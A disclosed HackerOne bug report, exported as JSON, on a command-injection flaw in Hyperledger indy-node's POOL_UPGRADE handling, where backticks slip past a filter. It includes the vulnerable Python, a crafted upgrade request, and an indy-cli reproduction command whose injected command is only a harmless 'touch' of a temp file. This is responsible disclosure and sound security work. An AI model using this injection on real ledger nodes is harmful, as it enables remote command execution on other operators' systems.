{
  "id": 1859592,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODU5NTky",
  "url": "https://hackerone.com/reports/1859592",
  "title": "[indy_node]POOL_UPGRADE command injection, Trustee Node can execute command in any other Node`s system.",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "none",
  "readable_substate": "Resolved",
  "created_at": "2023-02-02T14:44:12.152Z",
  "submitted_at": "2023-02-02T14:44:12.257Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "kmhlyxj0",
    "url": "/kmhlyxj0",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ge9nqc4uzovevjhsukseo1h76fhy/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22522,
    "url": "https://hackerone.com/hyperledger",
    "handle": "hyperledger",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/6t4gcsqjok9cz34ygw17mwkp1tsr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/6t4gcsqjok9cz34ygw17mwkp1tsr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Hyperledger",
      "twitter_handle": "hyperledger",
      "website": "https://www.hyperledger.org/",
      "about": "An industry-wide open source initiative to advance blockchain technology, governed by The Linux Foundation."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-04-27T14:48:14.887Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2023-04-11T15:49:42.151Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "After I finish my report, I found project this is not part of the bounty program, so I also commit this report. This issue is related to the [https://github.com/hyperledger/indy-node](https://github.com/hyperledger/indy-node).\n\nI found some function such as get_latest_pkg_version/_call_upgrade_script has  command injection vulnerability. \nnode_control_utils.py:\n```python\n    def get_latest_pkg_version(cls,pkg_name: str,upstream: SourceVersion = None, update_cache: bool = True) -> PackageVersion:\n        ...\n        try:\n            cmd = compose_cmd(\n                ['apt-cache', 'show', pkg_name, '|', 'grep', '-E', \"'^Version: '\"]\n            )\n            output = cls.run_shell_script_extended(cmd).strip()\n    ...\n```\nnode_control_noe.py:\n```python\n    def _call_upgrade_script(self, pkg_name: str, pkg_ver: PackageVersion):\n        logger.info(\n            \"Upgrading {} to package version {}, test_mode {}\"\n            .format(pkg_name, pkg_ver, int(self.test_mode))\n        )\n\n        deps = self._get_deps_list('{}={}'.format(pkg_name, pkg_ver))\n        deps = '\"{}\"'.format(deps)\n\n        cmd_file = 'upgrade_indy_node'\n        if self.test_mode:\n            cmd_file = 'upgrade_indy_node_test'\n\n        cmd = compose_cmd([cmd_file, deps])\n        NodeControlUtil.run_shell_script(cmd, timeout=self.timeout)\n```\nA Trustee can input a malicious package name to trigger this code.  There are two conditions for package name:\n1. Valid package name prefix, here I choose `indy-node`.\n2. Valid package version. Input value of version must bigger or equals than old version. If `reinstall` set to true, version can equal with the old version.\n3. bypass the fileter function `compose_cmd`. I found  some special characters  filtered in `compose_cmd` , that is `;|&&`:\n```python\ndef compose_cmd(cmd):\n    if os.name != 'nt':\n        cmd = ' '.join(cmd)\n        cmd = re.split(\";|&&\", cmd.splitlines()[0], 1)[0].rstrip()\n    return cmd\n```\nBut the special character \\`, is still valid to inject command. So I can input a package name , for example: indy-node2 \\`touch /tmp/12345678\\` . Finally The malicious POOL_UPGRADE request looks as follows:\n```json\n{\n    \"identifier\": \"V4SGRU86Z58d6TV7PBUe6f\",\n    \"operation\": {\n        \"action\": \"start\",\n        \"name\": \"test\",\n        \"package\": \"indy-node2 `touch /tmp/1234567`\",\n        \"schedule\": {\n            \"Gw6pDLhcBcoQesN72qfotTgFa7cbuqZpkX3Xo6pLhPhv\":\"2023-02-02T15:30:05.258870+00:00\",\n            \"8ECVSk179mjsjKRLWiQtssMLgp6EPhWXtaYyStWPSGAb\":\"2023-02-02T17:32:05.258870+00:00\",\n            \"DKVxG2fXXTU8yT5N7hGEbXB3dfdAnYv1JczDUHpmDxya\":\"2023-02-02T14:31:05.258870+00:00\",\n            \"4PS3EDQ3dW1tci1Bp6543CfuuebjFrg36kLAUcskGfaA\":\"2023-02-02T19:39:05.258870+00:00\"\n        },\n        \"sha256\": \"db34a72a90d026dae49c3b3f0436c8d3963476c77468ad955845a1ccf7b03f55\",\n        \"type\": \"109\",\n        \"reinstall\": true,\n        \"version\": \"1.12.6\"\n    },\n    \"protocolVersion\": 2,\n    \"reqId\": 1651152851,\n    \"signature\": \"4YoXKHNnWRouTUAW4fKuTANnXNJfY2JoPG4PoXfz4PUzjx4NySrAmzkzy6zCiRRf5uczZx5mQVSm1eCZLnUHUDoT\"\n}\n```\nStep to reproduce(use indy-cli):\n1. use indy-cli, Use a `TRUSTEE` DID:\n\n{F2150453} \n\n2. Run ledger pool_upgrade command, such as:\n\n```\nledger pool-upgrade name=\"security_test2\" version=1.12.6 action=start sha256=f284bdc3c1c9e24a494e285cb387c69510f28de51c15bb93179d9c7f28705398 schedule={\"Gw6pDLhcBcoQesN72qfotTgFa7cbuqZpkX3Xo6pLhPhv\":\"2023-02-02T15:30:05.258870+00:00\",\"8ECVSk179mjsjKRLWiQtssMLgp6EPhWXtaYyStWPSGAb\":\"2023-02-02T14:32:05.258870+00:00\",\"DKVxG2fXXTU8yT5N7hGEbXB3dfdAnYv1JczDUHpmDxya\":\"2023-02-02T13:31:05.258870+00:00\",\"4PS3EDQ3dW1tci1Bp6543CfuuebjFrg36kLAUcskGfaA\":\"2023-02-02T12:53:05.258870+00:00\"} package=\"indy-node `touch /tmp/1234567`\" reinstall=true\n```\n3. wait for schedule, you can what happend in `/var/log/indy/node_control.log`:\n\n{F2150481}\n\n## Impact\n\nA Trustee Node can execute command in any other Node`s system.",
  "weakness": {
    "id": 59,
    "name": "OS Command Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 2150453,
      "file_name": "image.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z02ggzozuvv3vd7mfjprqwxr98t3?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQQSQTJWE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143417Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICMbzzKBCraFobXOcCqfodxzM%2F89seEFEtkolz9ym8yYAiEA%2Fsvto%2F251HQZfvVraGJNSEE9N05zP%2BaGv%2FBSxh9MwpMqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDLRiPgXnAALYKAeN%2BSqPBWHgzJxP51a7MbYBgyoxP1LDcsLwdgUbUtgcBcVihNzgjkpkX1z4v6%2FjmlETXMHpM%2FauQHP0xGmCQhKLjGzIinKmY6tZ4kZl141nt3bExoUI5fWVsWEB7O84QdqCtoGtUZA0f1O7EIdYBJQb%2FmNKqwZEWaU%2F7PgkRk0H3XNrhegcIQuivj4XNypNwJPOxdtitDeFDYLpO12smqVJ5amk5ztkBZAoq8E%2Fxhaobm%2BP%2BcLxlPXFMWF2mULZXnUB%2BQexzDE%2FeLT2%2F%2FCafZViAqQkXNNhRc1onMPfkORBF3TWhoGrNIEBTcxPrms3Wk4KLaYQfHMpRmDn8NdWo6rpTdWGmrWp15yhtPtvFe8ReFe1qwFRwBcnvbxbIpos0u911N8KZcdmsYZha%2FoJ5gCaJUsYWiujZHGn6f5ac2aDT02iO7y%2FvFGh%2BiiCuJnTr%2FTPbUjsuYpUKRWvX0lbNazDhrREV3P7R16HgWupyfQVvDMUxflgXVEIBtoH%2F3PlfIvSwDTjDdb04Ji5mlT6sdPmo0lfcQgYurG6SnsI6MgswsJjYI2WOlv2p1tmsRt%2ByFO3bcNXUIH7i5sX1gS7pDgOE42otZhfgnqjvs281xt%2FxdyiAtfzcabnG58C%2F6LMJcKeiNXLZWzeSL%2FsIKZbRGv7%2BbTcyt4NUuw0Q8qvXsuEQa6pysO9CNZrAUmcPtXKlyDUNPvymrupyNL%2BTMEhXfQtQ9GR77FBbp2W1g6N%2BZC4U3Pyjd%2B5zay1bpkCArA0SfRd1XoibXzi71Y30tA%2FNUr4Rib62%2FqhPMoV5VVGpkLtyTBkmmVyf%2FESSQWdUjQsHkdlrlefv2cMA97YY4fWehghMcS0o3sWAL6LKEbcYmXkUd9uubUwzuGtrgY6sQGqVPKMUtXZrBKkrmums9UdPoAQiHM9bDEAcx6q6dTbsaND9EZI1kiWjVkhOtlNqyZzZiln%2BiwOaBZiB%2FQiRz7jN%2F4j0Xau5GsUBxICzxeYF6QfWg9kdjLfouuoymOG0OykNz%2FXKrjHdQ4BrNO6%2BP5iYizFhSP9s5uBbIRfMqyUWVBdXawoABdBVubTk5tCNVNh%2FWifWwE4VS1yIJoLSgY8wRQ3gW0tXMWlxD895PitKQQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=585187e4bcac7509e22835557023bc6a6d9e9ab11446dca2290afa8b70daa49b",
      "file_size": 41111,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 2150481,
      "file_name": "image.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6f6tibjp9vbbmd0spc7lf3vqgsf9?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQQSQTJWE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143417Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICMbzzKBCraFobXOcCqfodxzM%2F89seEFEtkolz9ym8yYAiEA%2Fsvto%2F251HQZfvVraGJNSEE9N05zP%2BaGv%2FBSxh9MwpMqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDLRiPgXnAALYKAeN%2BSqPBWHgzJxP51a7MbYBgyoxP1LDcsLwdgUbUtgcBcVihNzgjkpkX1z4v6%2FjmlETXMHpM%2FauQHP0xGmCQhKLjGzIinKmY6tZ4kZl141nt3bExoUI5fWVsWEB7O84QdqCtoGtUZA0f1O7EIdYBJQb%2FmNKqwZEWaU%2F7PgkRk0H3XNrhegcIQuivj4XNypNwJPOxdtitDeFDYLpO12smqVJ5amk5ztkBZAoq8E%2Fxhaobm%2BP%2BcLxlPXFMWF2mULZXnUB%2BQexzDE%2FeLT2%2F%2FCafZViAqQkXNNhRc1onMPfkORBF3TWhoGrNIEBTcxPrms3Wk4KLaYQfHMpRmDn8NdWo6rpTdWGmrWp15yhtPtvFe8ReFe1qwFRwBcnvbxbIpos0u911N8KZcdmsYZha%2FoJ5gCaJUsYWiujZHGn6f5ac2aDT02iO7y%2FvFGh%2BiiCuJnTr%2FTPbUjsuYpUKRWvX0lbNazDhrREV3P7R16HgWupyfQVvDMUxflgXVEIBtoH%2F3PlfIvSwDTjDdb04Ji5mlT6sdPmo0lfcQgYurG6SnsI6MgswsJjYI2WOlv2p1tmsRt%2ByFO3bcNXUIH7i5sX1gS7pDgOE42otZhfgnqjvs281xt%2FxdyiAtfzcabnG58C%2F6LMJcKeiNXLZWzeSL%2FsIKZbRGv7%2BbTcyt4NUuw0Q8qvXsuEQa6pysO9CNZrAUmcPtXKlyDUNPvymrupyNL%2BTMEhXfQtQ9GR77FBbp2W1g6N%2BZC4U3Pyjd%2B5zay1bpkCArA0SfRd1XoibXzi71Y30tA%2FNUr4Rib62%2FqhPMoV5VVGpkLtyTBkmmVyf%2FESSQWdUjQsHkdlrlefv2cMA97YY4fWehghMcS0o3sWAL6LKEbcYmXkUd9uubUwzuGtrgY6sQGqVPKMUtXZrBKkrmums9UdPoAQiHM9bDEAcx6q6dTbsaND9EZI1kiWjVkhOtlNqyZzZiln%2BiwOaBZiB%2FQiRz7jN%2F4j0Xau5GsUBxICzxeYF6QfWg9kdjLfouuoymOG0OykNz%2FXKrjHdQ4BrNO6%2BP5iYizFhSP9s5uBbIRfMqyUWVBdXawoABdBVubTk5tCNVNh%2FWifWwE4VS1yIJoLSgY8wRQ3gW0tXMWlxD895PitKQQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f983508156a2a14401f00fcd51dc55a0c792d8ce7714e4c7d7cf01ba522b157",
      "file_size": 97593,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2023-05-11T15:49:42.369Z",
  "allow_singular_disclosure_after": -24014675.593078654,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "zy9ard3",
    "shivammusic"
  ],
  "severity": {
    "rating": "none",
    "score": 0.0,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "high",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 179157,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/hyperledger/fabric-amcl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
